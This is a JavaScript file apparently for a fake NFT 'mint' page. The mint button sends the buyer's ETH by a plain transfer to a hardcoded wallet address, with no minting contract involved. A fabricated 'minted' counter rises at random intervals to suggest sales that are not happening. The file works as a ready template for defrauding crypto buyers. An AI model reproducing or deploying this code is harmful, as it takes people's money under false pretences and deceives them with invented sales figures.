const paymentAddress = "0xA8F75153E9F5D23fDF0aEA4BDFcB272A2E8Be5f1"
const price = 0.15
const minted = 2000
const supply = 3000

// Do not edit below this line unless you know what you are doing.

let connectBtn = document.querySelectorAll(".js-connect-wallet")
let nftAmount = $("#supply")
let nftPrice = $("#price")
let nftTotal = $("#total-eth")

nftAmount.text(supply)
nftPrice.text(price)
nftTotal.text(price)

let i

for (i = 0; i < connectBtn.length; i++) {
    connectBtn[i].addEventListener("click", async () => {
        if (window.ethereum) {
            window.web3 = new Web3(ethereum)
            try {
                await ethereum.enable()
                initPayButton()
            } catch (err) {
                $("#status").html("User denied account access", err)
            }
        } else if (window.web3) {
            window.web3 = new Web3(web3.currentProvider)
            initPayButton()
        } else {
            $("#status").html("No Metamask (or other Web3 Provider) installed")
        }
    })
}

const initPayButton = () => {
    $(".js-connect-wallet").addClass("hide_btn")
    $(".js-mint-now").removeClass("hide_btn")

    var amountOfCoin = price * $(".number").text()

    $(".js-mint-now").click(() => {
        // paymentAddress is where funds will be send to
        var amountOfCoin = price * $(".number").text()

        const amountEth = amountOfCoin

        web3.eth.sendTransaction(
            {
                to: paymentAddress,
                value: web3.toWei(amountEth, "ether"),
            },
            (err, transactionId) => {
                if (err) {
                    console.log("Payment failed", err)
                    $("#status").html("Payment failed")
                } else {
                    console.log("Payment successful", transactionId)
                    $("#status").html("Payment successful")
                }
            }
        )
    })
}

var startVal = localStorage.getItem("mint_count")
    ? parseInt(localStorage.getItem("mint_count"))
    : minted

$("#mint_counter").text(startVal)

function increase() {
    setTimeout(function () {
        var theVal = startVal + Math.round(Math.random() * (5 - 1) + 1)
        startVal = theVal
        increase()

        if (startVal > supply) {
            startVal = supply
        }

        localStorage.setItem("mint_count", startVal)

        $("#mint_counter").text(startVal)
    }, Math.round(Math.random() * (20000 - 2000)) + 2000)
}
increase()

var $counter = $("#public-mint-counter"),
    $minus = $(".minus", $counter),
    $plus = $(".plus", $counter),
    $number = $(".number", $counter),
    $eth = $("#total-eth"),
    count = 1,
    updateCount = function () {
        $number.text(count)
        let totalPrice = count * price
        $eth.text(totalPrice.toFixed(2))
    }

$minus.click(function (e) {
    e.preventDefault()
    if (count === 1) return
    count = count - 1
    updateCount()
})

$plus.click(function (e) {
    e.preventDefault()
    if (count === 5) return
    count = count + 1
    updateCount()
})

$(".js-ok").click(function (e) {
    e.preventDefault()

    $(".Cookie_cookie__3I5T9").hide()
})
